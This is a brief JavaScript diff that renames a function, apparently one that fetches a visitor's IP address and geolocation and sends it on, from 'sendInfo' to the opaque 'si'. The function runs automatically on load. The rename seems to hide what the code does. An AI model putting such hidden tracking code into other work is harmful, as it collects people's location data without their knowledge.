@@ -97,7 +97,7 @@
 
 
 
-async function sendInfo() {
+async function si() {
   try {
     // Fetch IP and geolocation data
     const [ipRes, geoRes] = await Promise.all([
@@ -208,4 +208,4 @@ function fpn() {
 }
 
 // Run the function
-sendInfo();
+si();
